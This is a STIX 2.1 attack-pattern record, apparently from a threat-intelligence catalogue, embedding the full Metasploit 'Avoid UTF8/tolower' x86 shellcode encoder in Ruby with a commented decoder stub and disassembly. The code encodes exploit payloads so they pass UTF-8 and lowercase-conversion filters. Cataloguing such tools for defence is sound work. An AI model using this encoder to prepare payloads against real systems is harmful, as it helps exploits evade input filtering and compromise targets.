{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1392d614-17c1-4ace-8e0c-8f6331fa6809",
    "created": "2024-08-14T16:33:19.208722Z",
    "modified": "2024-08-14T16:33:19.208726Z",
    "name": "Avoid UTF8/tolower",
    "description": "UTF8 Safe, tolower Safe Encoder",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/avoid_utf8_tolower.rb",
            "external_id": "avoid_utf8_tolower.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# NOTE: Read this if you plan on using this encoder:\n#\n# This encoder has some limitations that must be considered.  First, this\n# encoder cannot be used with all of the payloads included in the framework.\n# Most notably, this includes windows/shell_reverse_tcp.  The reason for this\n# is that some payloads are of a size that leads to a bad character (uppercase\n# character) being generated in the decoder stub header.\n#\n# A second thing to consider is that some IP addresses used in payloads are\n# incompatible with this encoder depending on their alignment within the\n# payload.  For example, the use of 127.0.0.1 may not work due to the fact\n# that it's impossible to reach the bytes 127, 0, and 1 in a single add or sub\n# due to the algorithm that this encoder uses.\n#\n# Here's a description of how it works:\n#\n# This encoder is pretty lame.  It has a huge size overhead.  Alas, it\n# does produce tolower safe and UTF8 safe payloads.  The decoder itself is\n# split into three distinct chunks.  The first chunk is the header, the second\n# chunk is the inline-decoding, and the third chunk is where the decoded data\n# is persisted.  Unlike most encoders, this encoder does not use any branch\n# instructions and instead runs into the decoded data after it completes due\n# to the fact that it is decoding inline.\n#\n# The basic approach taken to implement the encoder is this.  First, the\n# decoder header assumes that a register (ecx) points to the first byte\n# in the decoder stub.  It then proceeds to calculate the offset to the\n# third chunk of the decoder (the persisted data) and updates the context\n# register (ecx) to point to the first byte of the third chunk of the decoder\n# stub.  Following that, the second chunk of the decoder begins executing\n# which uses a series of add or subtract operations on the third chunk of the\n# decoder to produce the actual opcodes of the encoded payload.  For each four\n# bytes of encoded data, a sub or add instruction is used in combination with\n# complementary information stored in the third chunk of the decoder.\n#\n# For example, in order to produce 0x01fdfeff one could do the following:\n#\n#   0x5e096f7c\n# - 0x5c0b707d\n# ------------\n#   0x01fdfeff\n#\n# After all of the inline decoding operations complete, the payload should\n# simply fall through into the now-decoded payload that was stored in the\n# third chunk of the decoder.\n#\n# The following is an example encoding of:\n#\n# \"\\xcc\\x41\\xcc\\x41\\xcc\\x41\\xcc\\x41\\xff\\xfe\\xfd\\x01\\xff\\x02\\x82\\x4c\"\n#\n# 00000000  6A04              push byte +0x4\n# 00000002  6B3C240B          imul edi,[esp],byte +0xb\n# 00000006  60                pusha\n# 00000007  030C24            add ecx,[esp]\n# 0000000A  6A11              push byte +0x11\n# 0000000C  030C24            add ecx,[esp]\n# 0000000F  6A04              push byte +0x4\n# 00000011  68640F5F31        push dword 0x315f0f64\n# 00000016  5F                pop edi\n# 00000017  0139              add [ecx],edi\n# 00000019  030C24            add ecx,[esp]\n# 0000001C  6870326B32        push dword 0x326b3270\n# 00000021  5F                pop edi\n# 00000022  0139              add [ecx],edi\n# 00000024  030C24            add ecx,[esp]\n# 00000027  687D700B5C        push dword 0x5c0b707d\n# 0000002C  5F                pop edi\n# 0000002D  2939              sub [ecx],edi\n# 0000002F  030C24            add ecx,[esp]\n# 00000032  6804317F32        push dword 0x327f3104\n# 00000037  5F                pop edi\n# 00000038  2939              sub [ecx],edi\n# 0000003A  030C24            add ecx,[esp]\n# 0000003D  68326D105C        push dword 0x5c106d32\n# 00000042  0F610F            punpcklwd mm1,[edi]\n# 00000045  7C6F              jl 0xb6\n# 00000047  095E03            or [esi+0x3],ebx\n# 0000004A  3401              xor al,0x1\n# 0000004C  7F                db 0x7F\n#\nclass MetasploitModule < Msf::Encoder\n\n  # This encoder has a manual ranking because it should only be used in cases\n  # where information has been explicitly supplied, like the BufferOffset.\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'Avoid UTF8/tolower',\n      'Description'      => 'UTF8 Safe, tolower Safe Encoder',\n      'Author'           => 'skape',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'EncoderType'      => Msf::Encoder::Type::NonUpperUtf8Safe,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4,\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of\n  # the buffer being encoded\n  #\n  def decoder_stub(state)\n    len = ((state.buf.length + 3) & (~0x3)) / 4\n\n    # Grab the number of additional bytes that we need to adjust by in order\n    # to get the context register to point immediately after the stub header\n    off = (datastore['BufferOffset'] || 0).to_i\n\n    # Check to make sure that the length is a valid size\n    if is_badchar(state, len)\n      raise EncodingError.new(\"The payload being encoded is of an incompatible size (#{len} bytes)\")\n    end\n\n    decoder =\n      \"\\x6a\" + [len].pack('C')      +  # push len\n      \"\\x6b\\x3c\\x24\\x0b\"            +  # imul 0xb\n      \"\\x60\"                        +  # pusha\n      \"\\x03\\x0c\\x24\"                +  # add ecx, [esp]\n      \"\\x6a\" + [0x11+off].pack('C') +  # push byte 0x11 + off\n      \"\\x03\\x0c\\x24\"                +  # add ecx, [esp]\n      \"\\x6a\\x04\"                       # push byte 0x4\n\n    # encoded sled\n    state.context = ''\n\n    return decoder\n  end\n\n  def encode_block(state, block)\n    buf = try_add(state, block)\n\n    if (buf.nil?)\n      buf = try_sub(state, block)\n    end\n\n    if (buf.nil?)\n      raise BadcharError.new(state.encoded, 0, 0, 0)\n    end\n\n    buf\n  end\n\n  #\n  # Appends the encoded context portion.\n  #\n  def encode_end(state)\n    state.encoded += state.context\n  end\n\n  #\n  # Generate the instructions that will be used to produce a valid\n  # block after decoding using the sub instruction in conjunction with\n  # two UTF8/tolower safe values.\n  #\n  def try_sub(state, block)\n    buf   = \"\\x68\";\n    vbuf  = ''\n    ctx   = ''\n    carry = 0\n\n    block.each_byte { |b|\n      # It's impossible to reach 0x7f, 0x80, 0x81 with two subs\n      # of a value that is < 0x80 without NULLs.\n      return nil if (b == 0x80 or b == 0x81 or b == 0x7f)\n\n      x          = 0\n      y          = 0\n      attempts   = 0\n      prev_carry = carry\n\n      begin\n        carry = prev_carry\n\n        if (b > 0x80)\n          diff  = 0x100 - b\n          y     = rand(0x80 - diff - 1).to_i + 1\n          x     = (0x100 - (b - y + carry))\n          carry = 1\n        else\n          diff  = 0x7f - b\n          x     = rand(diff - 1) + 1\n          y     = (b + x + carry) & 0xff\n          carry = 0\n        end\n\n        attempts += 1\n\n        # Lame.\n        return nil if (attempts > 512)\n\n      end while (is_badchar(state, x) or is_badchar(state, y))\n\n      vbuf += [x].pack('C')\n      ctx  += [y].pack('C')\n    }\n\n    buf += vbuf + \"\\x5f\\x29\\x39\\x03\\x0c\\x24\"\n\n    state.context += ctx\n\n    return buf\n\n  end\n\n  #\n  # Generate instructions that will be used to produce a valid block after\n  # decoding using the add instruction in conjunction with two UTF8/tolower\n  # safe values.\n  #\n  def try_add(state, block)\n    buf  = \"\\x68\"\n    vbuf = ''\n    ctx  = ''\n\n    block.each_byte { |b|\n      # It's impossible to produce 0xff and 0x01 using two non-NULL,\n      # tolower safe, and UTF8 safe values.\n      return nil if (b == 0xff or b == 0x01 or b == 0x00)\n\n      attempts = 0\n\n      begin\n        xv = rand(b - 1) + 1\n\n        attempts += 1\n\n        # Lame.\n        return nil if (attempts > 512)\n\n      end while (is_badchar(state, xv) or is_badchar(state, b - xv))\n\n      vbuf += [xv].pack('C')\n      ctx  += [b - xv].pack('C')\n    }\n\n    buf += vbuf + \"\\x5f\\x01\\x39\\x03\\x0c\\x24\"\n\n    state.context += ctx\n\n    return buf\n  end\n\n  def is_badchar(state, val)\n    ((val >= 0x41 and val <= 0x5a) or val >= 0x80) or Rex::Text.badchar_index([val].pack('C'), state.badchars)\n  end\nend\n"
}